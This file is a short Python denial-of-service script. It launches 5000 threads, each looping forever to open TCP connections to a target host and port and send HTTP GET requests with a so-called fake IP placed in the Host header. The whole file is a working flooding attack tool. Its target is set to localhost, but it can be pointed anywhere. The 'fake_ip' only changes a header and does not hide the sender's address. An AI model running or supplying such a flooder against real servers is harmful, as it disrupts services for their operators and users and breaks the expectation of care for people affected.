import threading
import socket

# python doesn't support real multi-threading is simulated multi-threading
# so you're basically switching between the tasks as fast as possible

target = '127.0.0.1'
port = 80
fake_ip = '182.21.20.32'

already_connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        global already_connected
        already_connected += 1
        print(already_connected)


for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()
